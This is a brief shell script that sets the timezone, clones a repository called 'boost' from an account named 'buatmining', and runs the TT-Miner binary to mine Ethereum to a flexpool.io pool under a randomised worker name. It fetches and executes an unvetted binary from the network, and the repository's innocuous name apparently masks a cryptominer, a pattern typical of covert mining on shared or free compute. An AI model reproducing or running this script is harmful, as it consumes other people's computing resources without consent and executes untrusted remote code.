#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
git clone https://github.com/buatmining/boost.git
cd boost
chmod +x TT-Miner
./TT-Miner -coin eth -o ethproxy+tcp://eth-hk.flexpool.io:5555 -u wa.$(echo $(shuf -i 201-400 -n 1)-$)  -p x -PRGN -RH
